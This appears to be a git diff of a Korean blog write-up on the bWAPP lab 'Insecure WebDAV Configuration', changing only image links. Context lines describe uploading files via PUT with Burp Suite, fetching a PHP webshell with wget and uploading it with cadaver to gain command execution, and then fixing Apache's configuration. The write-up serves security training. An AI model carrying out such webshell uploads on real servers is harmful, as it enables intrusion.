@@ -90,7 +90,7 @@ title: "[bWAPP] 6. Security Misconfigurations - Insecure WebDAV Configuration"
 
 BurpSuit를 통해 /webdav/에 임의의 파일 업로드 해보자(PUT 메서드 사용)
 
-<img src="image-20211027204421206.png" alt="image-20211027204421206" style="zoom:58%;" />
+<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211109235615469.png" alt="image-20211109235615469" style="zoom:58%;" />
 
 - /webdav/ 페이지 패킷 잡음
 
@@ -100,7 +100,7 @@ BurpSuit를 통해 /webdav/에 임의의 파일 업로드 해보자(PUT 메서�
 
 GET -> PUT으로 변경
 
-<img src="image-20211027204325416.png" alt="image-20211027204325416" style="zoom:57%;" />
+<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211109235812953.png" alt="image-20211109235812953" style="zoom:57%;" />
 
 - 내용 "<h1>Eonion</h1>"인 파일 업로드하기 위해 intecept off
 
@@ -108,11 +108,11 @@ GET -> PUT으로 변경
 
 ### BurpSuite - 3
 
-<img src="image-20211027204231898.png" alt="image-20211027204231898" style="zoom:78%;" />
+<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211110000106525.png" alt="image-20211110000106525" style="zoom:78%;" />
 
 <img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211015013254384.png" alt="image-20211015013254384" style="zoom:80%;" />
 
-<img src="image-20211027204130395.png" alt="image-20211027204130395" style="zoom:105%;" />
+<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211110000209135.png" alt="image-20211110000209135" style="zoom:105%;" />
 
 - PUT 메서드를 통해 웹 서버에 파일 업로드 가능
 
@@ -126,7 +126,7 @@ GET -> PUT으로 변경
 
 칼리를 이용해 악의적인 파일 업로드 해보자
 
-<img src="image-20211027204019959.png" alt="image-20211027204019959" style="zoom:68%;" />
+<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211110000329590.png" alt="image-20211110000329590" style="zoom:68%;" />
 
 - Kali > wget [https://raw.githubusercontent.com/Wphackedhelp/php-webshells/master/PHP%20Shell.php](https://raw.githubusercontent.com/Wphackedhelp/php-webshells/master/PHP Shell.php) - 코드 다운로드
 - Kali >  cadaver http://비박스IP/webdav/ - 'Webdav' 클라이언트인 'cadaver' 사용
@@ -136,7 +136,7 @@ GET -> PUT으로 변경
 
 ### Kali - 2
 
-<img src="image-20211027203850950.png" alt="image-20211027203850950" style="zoom:80%;" />
+<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211110000439457.png" alt="image-20211110000439457" style="zoom:80%;" />
 
 - 웹 쉘을 통해 서버에 명령 수행 가능
 
@@ -150,7 +150,7 @@ GET -> PUT으로 변경
 
 아파치 설정 파일
 
-<img src="image-20211027203707999.png" alt="image-20211027203707999" style="zoom: 69%;" />
+<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211110000639656.png" alt="image-20211110000639656" style="zoom:69%;" />
 
 - bee-box > sudo -s 
 - bee-box > vi /etc/apache2/httpd.conf - 아파치 설정 파일
@@ -189,6 +189,6 @@ GET -> PUT으로 변경
 
 ### curl
 
-<img src="image-20211027203438202.png" alt="image-20211027203438202" style="zoom:58%;" />
+<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211110000746252.png" alt="image-20211110000746252" style="zoom:58%;" />
 
 - 위에서 HTTP 메소드를 알아내기 위해 사용했던 curl을 이용시 401 오류와 인증을 요구
